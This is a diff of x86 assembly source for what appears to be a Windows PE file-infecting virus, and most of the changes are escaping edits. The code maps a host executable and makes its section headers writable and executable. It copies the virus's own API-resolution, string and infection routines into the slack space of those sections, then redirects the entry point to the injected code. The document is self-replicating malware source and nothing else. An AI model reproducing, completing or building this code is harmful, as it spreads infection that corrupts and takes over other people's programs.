+    add  ecx, offset _offset - offset start + 4
+    sub  ecx, \[esp + 20\]
+    pop  ebp
+    sub  ebp, ecx
+    xchg  ebp, ecx
+    call  @f
+@@:
+    pop  ebp
+    sub  ebp, offset @b
+    mov  esi, offset pstart_0
+    add  esi, ebp
+    mov  esi, \[esi\]
+    push  esi
+    add  esi, offset _offset - offset start
+    mov  edx, \[esi\]
+    mov  \[esi\], ecx
+    pop  esi
+    mov  ecx, offset _start_end - offset start
+@@:
+    movsb
+    dec  ecx
+    jnz  @b
+    pop  ecx
+    push  esi
+    lea  esi, \[esp + 40\]
+    movsd
+    lea  esi, \[esp + 48\]
+    movsd
+    lea  esi, \[esp + 20\]
+    movsd
+    pop  esi
+    pop  edi
+    push  esi
+    lea  esi, \[esp + 48\]
+    movsd
+    pop  esi
+    sub  esi, offset _start_end - offset _offset
+    mov  \[esi\], edx
+_AddCode_end3:     
+    mov  eax, offset ProcAddr_3
+    add  eax, ebp
+    mov  eax, dword ptr \[eax\]
+    add  eax, offset pUnmapViewOfFile - offset _ProcAddr
+    push  ebx
+    call  dword ptr \[eax\]
+_AddCode_end2:
+    mov  eax, offset ProcAddr_3
+    add  eax, ebp
+    mov  eax, dword ptr \[eax\]
+    add  eax, offset pCloseHandle - offset _ProcAddr
+    push  \[esp + 4\]
+    call  dword ptr \[eax\]
+_AddCode_end1:
+    mov  eax, offset ProcAddr_3
+    add  eax, ebp
+    mov  eax, dword ptr \[eax\]
+    add  eax, offset pCloseHandle - offset _ProcAddr
+    push  \[esp\]
+    call  dword ptr \[eax\]
+_AddCode_end0:
+    add   esp, 52
+    popad
+    retn  4
+     
 
-    mov  \[eax\].Characteristics, 0E00000E0h    
-    mov  edx, \[eax\].SizeOfRawData
-    sub  edx, \[eax\].Misc.VirtualSize
-    mov  edi, \[eax\].PointerToRawData
-    add  edi, \[eax\].Misc.VirtualSize
-    add  edi, ebx
-\_1:    
-    sub  edx, offset \_ProcAddr - offset \_ProcName
-    mov  esi, 1
-    jl  \_jmptable
-    add  \[eax\].Misc.VirtualSize, offset \_ProcAddr - offset \_ProcName
-    mov  esi, edi
-    sub  esi, \[eax\].PointerToRawData
-    add  esi, \[eax\].VirtualAddress
-    add  esi, \[esp + 8\]
-    sub  esi, ebx
-    mov  \[esp + 12\], esi        ;\[esp + 12\] = ProcAddr
-    mov  esi, offset ProcAddr\_3
-    add  esi, ebp
-    mov  esi, \[esi\]
-    push  ecx
-    mov  ecx, 10
-@@:
-    movsd
-    dec  ecx
-    jnz  @b
-    pop  ecx
-\_2:      
-    sub  edx, offset \_strlen - offset \_ProcName
-    mov  esi, 2
-    jl  \_jmptable
-    add  \[eax\].Misc.VirtualSize, offset \_strlen - offset \_ProcName
-    mov  esi, edi
-    sub  esi, \[eax\].PointerToRawData
-    add  esi, \[eax\].VirtualAddress
-    add  esi, \[esp + 8\]
-    sub  esi, ebx
-    mov  \[esp+16\], esi        ;\[esp + 16\] = ProcName
-    mov  esi, offset ProcName\_1
-    add  esi, ebp
-    mov  esi, \[esi\]
-    push  ecx
-    mov  ecx, offset \_strlen - offset \_ProcName
-@@:
-    movsb
-    dec   ecx
-    jnz  @b
-    pop  ecx
-\_3:    
-    sub  edx, offset \_strcmp - offset \_strlen
-    mov  esi, 3
-    jl  \_jmptable
-    add  \[eax\].Misc.VirtualSize, offset \_strcmp - offset \_strlen
-    mov  esi, edi
-    sub  esi, \[eax\].PointerToRawData
-    add  esi, \[eax\].VirtualAddress
-    add  esi, \[esp + 8\]
-    sub  esi, ebx
-    mov  \[esp + 20\], esi        ;\[esp + 20\] = \_strlen
-    mov  esi, offset pstrlen\_2
-    add  esi, ebp
-    mov  esi, \[esi\]
-    push  ecx
-    mov  ecx, offset \_strcmp - offset \_strlen
-@@:
-    movsb
-    dec  ecx
-    jnz  @b
-    pop  ecx
-\_4:    
-    sub  edx, offset \_strcmp\_end - offset \_strcmp + 4
-    mov  esi, 4
-    jl  \_jmptable
-    add  \[eax\].Misc.VirtualSize, offset \_strcmp\_end - offset \_strcmp + 4
-    mov  esi, edi
-    sub  esi, \[eax\].PointerToRawData
-    add  esi, \[eax\].VirtualAddress
-    add  esi, \[esp + 8\]
-    sub  esi, ebx
-    mov  \[esp + 24\], esi        ;\[esp + 24\] = \_strcmp
-    mov  esi, offset pstrcmp\_1
-    add  esi, ebp
-    mov  esi, \[esi\]
-    push  ecx
-    mov  ecx, offset \_strcmp\_end - offset \_strcmp
-@@:
-    movsb
-    dec  ecx
-    jnz  @b
-    pop  ecx
-    lea  esi, \[esp + 20\]
-    movsd
-\_5:    
-    sub  edx, offset \_GetProcAddr\_end - offset \_GetProcAddr + 4
-    mov  esi, 5
-    jl  \_jmptable
-    add  \[eax\].Misc.VirtualSize, offset \_GetProcAddr\_end - offset \_GetProcAddr + 4
-    mov  esi, edi
-    sub  esi, \[eax\].PointerToRawData
-    add  esi, \[eax\].VirtualAddress
-    add  esi, \[esp + 8\]
-    sub  esi, ebx
-    mov  \[esp + 28\], esi        ;\[esp + 28\] = \_GetProcAddr
-    mov  esi, offset pGetProcAddr\_1
-    add  esi, ebp
-    mov  esi, \[esi\]
-    push  ecx
-    mov  ecx, offset \_GetProcAddr\_end - offset \_GetProcAddr
-@@:
-    movsb
-    dec  ecx
-    jnz  @b
-    pop  ecx
-    lea  esi, \[esp + 24\]
-    movsd
-\_6:    
-    sub  edx, offset \_GetAllProcAddr\_end - offset \_GetAllProcAddr + 16
-    mov  esi, 6
-    jl  \_jmptable
-    add  \[eax\].Misc.VirtualSize, offset \_GetAllProcAddr\_end - offset \_GetAllProcAddr + 16
-    mov  esi, edi
-    sub  esi, \[eax\].PointerToRawData
-    add  esi,\[eax\].VirtualAddress
-    add  esi, \[esp + 8\]
-    sub  esi, ebx
-    mov  \[esp + 32\], esi        ;\[esp + 32\] = \_GetAllProcAddr
-    mov  esi, offset pGetAllProcAddr\_1
-    add  esi, ebp
-    mov  esi, \[esi\]
-    push  ecx
-    mov  ecx, offset \_GetAllProcAddr\_end - offset \_GetAllProcAddr
-@@:
-    movsb
-    dec  ecx
-    jnz  @b
-    pop  ecx
-    lea  esi, \[esp + 28\]
-    movsd
-    lea  esi, \[esp + 20\]
-    movsd
-    lea  esi, \[esp + 16\]
-    movsd
-    lea  esi, \[esp + 12\]
-    movsd
-\_7:    
-    sub  edx, offset \_AddCode\_end - offset \_AddCode + 36
-    mov  esi, 7
-    jl  \_jmptable
-    add  \[eax\].Misc.VirtualSize, offset \_AddCode\_end - offset \_AddCode + 36
-    mov  esi, edi
-    sub  esi, \[eax\].PointerToRawData
-    add  esi, \[eax\].VirtualAddress
-    add  esi, \[esp + 8\]
-    sub  esi, ebx
-    mov  \[esp + 36\], esi        ;\[esp + 36\] = \_AddCode
-    mov  esi, offset pAddCode\_1
-    add  esi, ebp
-    mov  esi, \[esi\] 
-    push  ecx
-    mov  ecx, offset \_AddCode\_end - offset \_AddCode
-@@:
-    movsb
-    dec  ecx
-    jnz  @b
-    pop  ecx
-    lea  esi, \[esp +12\]
-    movsd
-    lea  esi, \[esp + 16\]
-    movsd
-    lea  esi, \[esp + 20\]
-    movsd
-    lea  esi, \[esp + 24\]
-    movsd
-    lea  esi, \[esp + 28\]
-    movsd
-    lea  esi, \[esp + 32\]
-    movsd
-    push  edi
-    movsd
-    lea  esi, \[esp + 40\]
-    movsd
-    push  edi
-    movsd
-\_8:    
-    sub  edx, offset \_AddCode - offset \_Infect + 8
-    mov  esi, 8
-    jl  \_jmptable
-    add  \[eax\].Misc.VirtualSize, offset \_AddCode - offset \_Infect + 8
-    mov  esi, edi
-    sub  esi, \[eax\].PointerToRawData
-    add  esi, \[eax\].VirtualAddress
-    add  esi, \[esp + 16\]
-    sub  esi, ebx
-    mov  \[esp + 48\], esi        ;\[esp + 40\] = \_Infect
-    mov  esi, offset pInfect\_1
-    add  esi, ebp
-    mov  esi, \[esi\]
-    push  ecx
-    mov  ecx, offset \_Infect\_end - offset \_Infect
-@@:
-    movsb
-    dec  ecx
-    jnz  @b
-    pop  ecx
-    lea  esi, \[esp + 44\]
-    movsd
-    lea  esi, \[esp + 20\]
-    movsd
-    pop  esi
-    push  ecx
-    mov  ecx, \[esp + 48\]
-    mov  \[esi\], ecx
-    pop  ecx
-\_9:
-    sub  edx, offset \_start\_end - offset start + 16
-    mov  esi, 9
-    jl  \_jmptable
-    add  \[eax\].Misc.VirtualSize, offset \_start\_end - offset start + 16 
-    push  ecx
-    mov  esi, edi
-    sub  esi, \[eax\].PointerToRawData
-    add  esi, \[eax\].VirtualAddress
-    sub  esi, ebx
-    mov  ecx, \[esp + 56\]
-    push  \[ecx\]
-    mov  \[ecx\], esi
-    add  esi, \[esp + 20\]
-    mov  \[esp + 56\], esi        ;\[esp + 44\] = start
-    mov  ecx, esi
-    add  ecx, offset \_offset - offset start + 4
-    sub  ecx, \[esp + 20\]
-    pop  ebp
-    sub  ebp, ecx
-    xchg  ebp, ecx
-    call  @f
-@@:
-    pop  ebp
-    sub  ebp, offset @b
-    mov  esi, offset pstart\_0
-    add  esi, ebp
-    mov  esi, \[esi\]
-    push  esi
-    add  esi, offset \_offset - offset start
-    mov  edx, \[esi\]
-    mov  \[esi\], ecx
-    pop  esi
-    mov  ecx, offset \_start\_end - offset start
-@@:
-    movsb
-    dec  ecx
-    jnz  @b
-    pop  ecx
-    push  esi
-    lea  esi, \[esp + 40\]
-    movsd
-    lea  esi, \[esp + 48\]
-    movsd
-    lea  esi, \[esp + 20\]
-    movsd
-    pop  esi
-    pop  edi
-    push  esi
-    lea  esi, \[esp + 48\]
-    movsd
-    pop  esi
-    sub  esi, offset \_start\_end - offset \_offset
-    mov  \[esi\], edx
-\_AddCode\_end3:    
-    mov  eax, offset ProcAddr\_3
-    add  eax, ebp
-    mov  eax, dword ptr \[eax\]
-    add  eax, offset pUnmapViewOfFile - offset \_ProcAddr
-    push  ebx
-    call  dword ptr \[eax\]
-\_AddCode\_end2:
-    mov  eax, offset ProcAddr\_3
-    add  eax, ebp
-    mov  eax, dword ptr \[eax\]
-    add  eax, offset pCloseHandle - offset \_ProcAddr
-    push  \[esp + 4\]
-    call  dword ptr \[eax\]
-\_AddCode\_end1:
-    mov  eax, offset ProcAddr\_3
-    add  eax, ebp
-    mov  eax, dword ptr \[eax\]
-    add  eax, offset pCloseHandle - offset \_ProcAddr
-    push  \[esp\]
-    call  dword ptr \[eax\]
-\_AddCode\_end0:
-    add   esp, 52
-    popad
-    retn  4
-    
-\_jmptable:  
-    dec  ecx
-    jz  \_AddCode\_ret
-    add  eax, sizeof(IMAGE\_SECTION\_HEADER)
-    mov  \[eax\].Characteristics, 0E00000E0h
-    mov  edx, \[eax\].SizeOfRawData
-    sub  edx, \[eax\].Misc.VirtualSize
-    mov  edi, \[eax\].PointerToRawData
-    add  edi, \[eax\].Misc.VirtualSize
-    add  edi, ebx
-    dec  esi
-    jz  \_1
-    dec  esi
-    jz  \_2
-    dec  esi
-    jz  \_3
-    dec  esi
-    jz  \_4
-    dec  esi
-    jz  \_5
-    dec  esi
-    jz  \_6
-    dec  esi
-    jz  \_7
-    dec  esi
-    jz  \_8
-    dec  esi
-    jz  \_9
-\_AddCode\_ret:
-    sub  esi, 8
-    jz  \_AddCode\_ret8
-    dec  esi
-    jz  \_AddCode\_ret9
-    jmp  \_AddCode\_end3
-\_AddCode\_ret8:
-    pop  eax
-\_AddCode\_ret9:
-    pop  eax
-    jmp  \_AddCode\_end3
-\_AddCode   endp
+_jmptable:  
+    dec  ecx
+    jz  _AddCode_ret
+    add  eax, sizeof(IMAGE_SECTION_HEADER)
+    mov  \[eax\].Characteristics, 0E00000E0h
+    mov  edx, \[eax\].SizeOfRawData
+    sub  edx, \[eax\].Misc.VirtualSize
+    mov  edi, \[eax\].PointerToRawData
+    add  edi, \[eax\].Misc.VirtualSize
+    add  edi, ebx
+    dec  esi
+    jz  _1
+    dec  esi
+    jz  _2
+    dec  esi
+    jz  _3
+    dec  esi
+    jz  _4
+    dec  esi
+    jz  _5
+    dec  esi
+    jz  _6
+    dec  esi
+    jz  _7
+    dec  esi
+    jz  _8
+    dec  esi
+    jz  _9
+_AddCode_ret:
+    sub  esi, 8
+    jz  _AddCode_ret8
+    dec  esi
+    jz  _AddCode_ret9
+    jmp  _AddCode_end3
+_AddCode_ret8:
+    pop  eax
+_AddCode_ret9:
+    pop  eax
+    jmp  _AddCode_end3
+_AddCode   endp
 
-\_AddCode\_end:
-ProcAddr\_3    dd  offset \_ProcAddr
-ProcName\_1    dd  offset \_ProcName
-pstrlen\_2    dd  offset \_strlen
-pstrcmp\_1    dd  offset \_strcmp
-pGetProcAddr\_1    dd  offset \_GetProcAddr
-pGetAllProcAddr\_1  dd  offset \_GetAllProcAddr
-pstart\_0    dd  offset start
-pAddCode\_1    dd  offset \_AddCode
-pInfect\_1    dd  offset \_Infect
+_AddCode_end:
+ProcAddr_3    dd  offset _ProcAddr
+ProcName_1    dd  offset _ProcName
+pstrlen_2    dd  offset _strlen
+pstrcmp_1    dd  offset _strcmp
+pGetProcAddr_1    dd  offset _GetProcAddr
+pGetAllProcAddr_1  dd  offset _GetAllProcAddr
+pstart_0    dd  offset start
+pAddCode_1    dd  offset _AddCode
+pInfect_1    dd  offset _Infect
 
-\_end:    
-    end  start
-
+_end:     
+    end  start
 ```
